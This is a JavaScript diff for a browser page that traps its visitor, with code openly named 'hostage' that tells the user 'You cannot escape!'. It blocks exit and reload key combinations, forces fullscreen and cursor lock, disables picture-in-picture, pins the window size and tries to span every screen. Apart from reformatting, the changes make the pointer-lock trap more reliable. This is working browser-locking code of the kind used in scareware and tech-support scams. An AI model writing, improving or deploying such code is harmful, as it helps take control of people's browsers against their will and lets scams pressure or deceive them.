@@ -2,6 +2,7 @@
 
 let delivered = false;
 let mutationSyncScheduled = false;
+let pendingPointerLock = false;
 
 const blockedCombinations = [
   { key: "F11", keyCode: 122, ctrl: false, alt: false, shift: false },
@@ -10,8 +11,8 @@ const blockedCombinations = [
   { key: "F4", keyCode: 115, ctrl: true, alt: true, shift: false },
   { key: "win", keyCode: 91, ctrl: false, alt: false, shift: false },
   { key: "F10", keyCode: 121, ctrl: false, alt: false, shift: false },
-  { key : "r", keyCode: 82, ctrl: true, alt: false, shift: false},
-  { key : "x", keyCode: 88, ctrl: true, alt: false, shift: false},
+  { key: "r", keyCode: 82, ctrl: true, alt: false, shift: false },
+  { key: "x", keyCode: 88, ctrl: true, alt: false, shift: false },
 ];
 
 function warnBlockedAction() {
@@ -31,7 +32,8 @@ function onClipboardEvent(event) {
 function keyboardEventHandler(event) {
   for (const combination of blockedCombinations) {
     if (
-      (event.key === combination.key || event.keyCode === combination.keyCode) &&
+      (event.key === combination.key ||
+        event.keyCode === combination.keyCode) &&
       event.ctrlKey === combination.ctrl &&
       event.altKey === combination.alt &&
       event.shiftKey === combination.shift
@@ -70,10 +72,15 @@ function requestFullscreenBestEffort() {
 }
 
 function requestPointerLockBestEffort() {
-  const target = document.body || document.documentElement;
+  const target = document.fullscreenElement || document.body || document.documentElement;
 
   if (!target || typeof target.requestPointerLock !== "function") {
     console.warn("Pointer Lock API is not supported by this browser.");
+    return;
+  }
+
+  if (target.ownerDocument !== document) {
+    console.warn("Pointer lock target belongs to a different document.");
     return;
   }
 
@@ -91,8 +98,12 @@ function syncPointerLockState() {
   setCursorLocked(Boolean(document.pointerLockElement));
 
   if (delivered && document.fullscreenElement && !document.pointerLockElement) {
-    const target = document.body || document.documentElement;
+    const target = document.fullscreenElement || document.body || document.documentElement;
     if (target && typeof target.requestPointerLock === "function") {
+      if (target.ownerDocument !== document) {
+        return;
+      }
+
       target.requestPointerLock().catch((err) => {
         // Silently fail on gesture/permission errors
         if (err.name !== "NotAllowedError") {
@@ -109,6 +120,11 @@ function onFullscreenChange() {
   } else {
     console.log("Welcome to the full screen experience!");
     syncPointerLockState();
+
+    if (pendingPointerLock) {
+      pendingPointerLock = false;
+      requestPointerLockBestEffort();
+    }
   }
 }
 
@@ -117,18 +133,8 @@ function Escape() {
     delivered = true;
     document.body.append(document.createTextNode("You cannot escape!"));
     setCursorLocked(true);
+    pendingPointerLock = true;
     requestFullscreenBestEffort();
-
-    // Pointer lock should only be requested after user gesture is confirmed
-    const target = document.body || document.documentElement;
-    if (target && typeof target.requestPointerLock === "function") {
-      target.requestPointerLock().catch((err) => {
-        // Expected if no fullscreen yet
-        if (err.name !== "NotAllowedError") {
-          console.error("Pointer lock error:", err);
-        }
-      });
-    }
   }
 }
 
@@ -168,14 +174,16 @@ function syncHostagePage() {
 
 function logUnexpectedMutations(mutations) {
   // Filter out script, style, and meta tag mutations which are expected
-  const filteredMutations = mutations.filter(mutation => {
+  const filteredMutations = mutations.filter((mutation) => {
     const target = mutation.target?.nodeName?.toLowerCase();
-    if (target === 'script' || target === 'style' || target === 'meta') return false;
+    if (target === "script" || target === "style" || target === "meta")
+      return false;
 
     // Filter out text node mutations from script tags
-    if (mutation.type === 'childList') {
+    if (mutation.type === "childList") {
       for (const node of mutation.addedNodes) {
-        if (node.parentElement?.nodeName?.toLowerCase() === 'script') return false;
+        if (node.parentElement?.nodeName?.toLowerCase() === "script")
+          return false;
       }
     }
 
@@ -226,10 +234,19 @@ function hostage() {
       });
 
       // Override the instance method to block requests
-      if (HTMLVideoElement && HTMLVideoElement.prototype.requestPictureInPicture) {
-        HTMLVideoElement.prototype._origRequestPictureInPicture = HTMLVideoElement.prototype.requestPictureInPicture;
+      if (
+        HTMLVideoElement &&
+        HTMLVideoElement.prototype.requestPictureInPicture
+      ) {
+        HTMLVideoElement.prototype._origRequestPictureInPicture =
+          HTMLVideoElement.prototype.requestPictureInPicture;
         HTMLVideoElement.prototype.requestPictureInPicture = function () {
-          return Promise.reject(new DOMException('Picture-in-Picture disabled by application', 'NotAllowedError'));
+          return Promise.reject(
+            new DOMException(
+              "Picture-in-Picture disabled by application",
+              "NotAllowedError",
+            ),
+          );
         };
       }
 
@@ -237,13 +254,13 @@ function hostage() {
       const vidObserver = new MutationObserver((mutations) => {
         for (const m of mutations) {
           for (const node of m.addedNodes) {
-            if (node && node.nodeName === 'VIDEO') {
+            if (node && node.nodeName === "VIDEO") {
               try {
                 node.disablePictureInPicture = true;
               } catch (e) {}
             }
             if (node && node.querySelectorAll) {
-              node.querySelectorAll('video').forEach((v) => {
+              node.querySelectorAll("video").forEach((v) => {
                 try {
                   v.disablePictureInPicture = true;
                 } catch (e) {}
@@ -253,9 +270,12 @@ function hostage() {
         }
       });
 
-      vidObserver.observe(document.documentElement, { childList: true, subtree: true });
+      vidObserver.observe(document.documentElement, {
+        childList: true,
+        subtree: true,
+      });
     } catch (err) {
-      console.warn('PiP prevention not supported in this environment:', err);
+      console.warn("PiP prevention not supported in this environment:", err);
     }
   }
 
@@ -265,40 +285,44 @@ function hostage() {
       const initial = { width: window.innerWidth, height: window.innerHeight };
 
       // Apply CSS layout lock to the document to keep internal layout stable
-      document.documentElement.style.overflow = 'hidden';
-      document.documentElement.style.width = initial.width + 'px';
-      document.documentElement.style.height = initial.height + 'px';
-      document.body.style.overflow = 'hidden';
-      document.body.style.width = '100%';
-      document.body.style.height = '100%';
+      document.documentElement.style.overflow = "hidden";
+      document.documentElement.style.width = initial.width + "px";
+      document.documentElement.style.height = initial.height + "px";
+      document.body.style.overflow = "hidden";
+      document.body.style.width = "100%";
+      document.body.style.height = "100%";
 
       let resizing = false;
-      window.addEventListener('resize', () => {
-        if (resizing) return;
-        resizing = true;
-        // Attempt to restore size for windows that allow programmatic resize (usually only for popups)
-        try {
-          if (typeof window.resizeTo === 'function') {
-            window.resizeTo(initial.width, initial.height);
-            window.scrollTo(0, 0);
+      window.addEventListener(
+        "resize",
+        () => {
+          if (resizing) return;
+          resizing = true;
+          // Attempt to restore size for windows that allow programmatic resize (usually only for popups)
+          try {
+            if (typeof window.resizeTo === "function") {
+              window.resizeTo(initial.width, initial.height);
+              window.scrollTo(0, 0);
+            }
+          } catch (e) {
+            // ignore if browser forbids programmatic resize
           }
-        } catch (e) {
-          // ignore if browser forbids programmatic resize
-        }
-        // Ensure layout styles stay applied
-        document.documentElement.style.width = initial.width + 'px';
-        document.documentElement.style.height = initial.height + 'px';
-        resizing = false;
-      }, { passive: true });
+          // Ensure layout styles stay applied
+          document.documentElement.style.width = initial.width + "px";
+          document.documentElement.style.height = initial.height + "px";
+          resizing = false;
+        },
+        { passive: true },
+      );
     } catch (err) {
-      console.warn('Window lock not fully available:', err);
+      console.warn("Window lock not fully available:", err);
     }
   }
 
   // Use the Window Placement API to detect multi-screen setups and attempt to span the window
   async function trySpanAcrossScreens() {
     try {
-      if (!('getScreenDetails' in window) && !('getScreens' in window)) {
+      if (!("getScreenDetails" in window) && !("getScreens" in window)) {
         // Not supported
         return;
       }
@@ -306,8 +330,10 @@ function hostage() {
       // Request permission for window-placement if available (only with user gesture)
       try {
         if (navigator.permissions && navigator.permissions.query) {
-          const p = await navigator.permissions.query({ name: 'window-placement' });
-          if (p && p.state !== 'granted') {
+          const p = await navigator.permissions.query({
+            name: "window-placement",
+          });
+          if (p && p.state !== "granted") {
             // Permission not granted, skip multi-screen logic
             return;
           }
@@ -317,13 +343,18 @@ function hostage() {
         return;
       }
 
-      const sd = await (window.getScreenDetails ? window.getScreenDetails() : window.getScreens());
+      const sd = await (window.getScreenDetails
+        ? window.getScreenDetails()
+        : window.getScreens());
       if (!sd) return;
 
       if (sd.isExtended) {
         // Compute bounding rectangle across all screens
         const screens = sd.screens || sd;
-        let minLeft = Infinity, minTop = Infinity, maxRight = -Infinity, maxBottom = -Infinity;
+        let minLeft = Infinity,
+          minTop = Infinity,
+          maxRight = -Infinity,
+          maxBottom = -Infinity;
         for (const s of screens) {
           const left = s.left || s.availLeft || 0;
           const top = s.top || s.availTop || 0;
@@ -340,19 +371,23 @@ function hostage() {
 
         // Try to move and resize the window to span both screens (best-effort)
         try {
-          if (typeof window.moveTo === 'function') window.moveTo(minLeft, minTop);
-          if (typeof window.resizeTo === 'function') window.resizeTo(totalWidth, totalHeight);
+          if (typeof window.moveTo === "function")
+            window.moveTo(minLeft, minTop);
+          if (typeof window.resizeTo === "function")
+            window.resizeTo(totalWidth, totalHeight);
         } catch (e) {
           // If moving/resizing is not allowed, fall back to fullscreen on the current screen
           try {
-            document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+            document.documentElement
+              .requestFullscreen({ navigationUI: "hide" })
+              .catch(() => {});
           } catch (fsErr) {}
         }
       }
     } catch (err) {
       // Silently fail for gesture-related errors
       if (err.name !== "NotAllowedError") {
-        console.warn('Multi-screen placement failed or not supported:', err);
+        console.warn("Multi-screen placement failed or not supported:", err);
       }
     }
   }
